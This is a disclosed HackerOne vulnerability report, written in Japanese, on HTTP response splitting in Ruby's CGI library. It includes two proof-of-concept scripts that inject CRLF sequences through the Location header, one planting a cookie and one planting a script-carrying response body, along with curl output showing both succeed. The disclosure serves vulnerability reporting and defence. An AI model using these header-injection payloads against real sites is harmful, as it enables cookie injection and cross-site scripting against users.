# RubyのCGIライブラリにHTTPレスポンス分割（HTTPヘッダインジェクション）があり、秘密情報が漏洩する

## Report Details
- **Report ID**: 1204695
- **URL**: https://hackerone.com/reports/1204695
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-05-21T01:10:02.734Z
- **Disclosed**: 2022-11-24T01:46:39.911Z

## Reporter
- **Username**: htokumaru
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
PoC1:
```
#!/usr/bin/env ruby
require 'cgi'
cgi = CGI.new
url = "http://example.jp\r\nSet-Cookie: foo=bar;"     # External Parameter
print cgi.header({'status' => '302 Found', 'Location' => url})
```

Actual Result1:
```
$ curl -s -i http://localhost:8080/cgi-bin/cgi.ru
HTTP/1.1 302 Found
Date: Fri, 21 May 2021 00:46:33 GMT
Server: Apache/2.2.31 (Unix)
Set-Cookie: foo=bar;
Location: http://example.jp
Content-Length: 0
Content-Type: text/html

```

このケースでは不正なクッキーが注入される。


PoC2:
```
#!/usr/bin/env ruby
require 'cgi'
cgi = CGI.new
url = "http://example.jp\r\nStatus: 500\r\n\r\n<script>alert(1)</script>"  # External Parameter
print cgi.header({'status' => '302 Found', 'Location' => url})
```

Actual Result2:
```
$ curl -s -i http://localhost:8080/cgi-bin/cgi.ru
HTTP/1.1 500 Internal Server Error
Date: Fri, 21 May 2021 00:49:44 GMT
Server: Apache/2.2.31 (Unix)
Location: http://example.jp
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html

<script>alert(1)</script>

```

このケースでは500 Internal Server Errorのため、Locationヘッダは無視され、JavaScriptが実行される。

## Impact

意図しないHTTPレスポンスヘッダやHTTPレスポンスボディを外部から注入できます。
単純なHTTPヘッダインジェクションでは、クッキーのインジェクションやリダイレクト等が主な影響となりますが、このケースでは、レスポンスボディが注入できるため、不正なJavaScript実行に及ぶため、影響が大きいと考えます。

他の言語の場合、PHPのheader関数は "\r"  "\n"   "\r\n"   等をすべてエラーにするため、上記の攻撃はできません。

過去のWEBrickやPumaにも類似の脆弱性がありましたが、これらは単独のキャリッジリターン "\r" による攻撃しかできず、リバースプロキシとしてNginxがあれば、Nginx側にてエラーになります。したがって、現実的な危険性はほとんどないと考えます。

https://www.ruby-lang.org/en/news/2019/10/01/http-response-splitting-in-webrick-cve-2019-16254/
https://github.com/puma/puma/security/advisories/GHSA-84j7-475p-hp8v

一方、今回報告した問題は、CGIの仕様上ウェブサーバーやリバースプロキシ側でエラーにすることはできないため、影響が現実的です。

## Attachments
No attachments
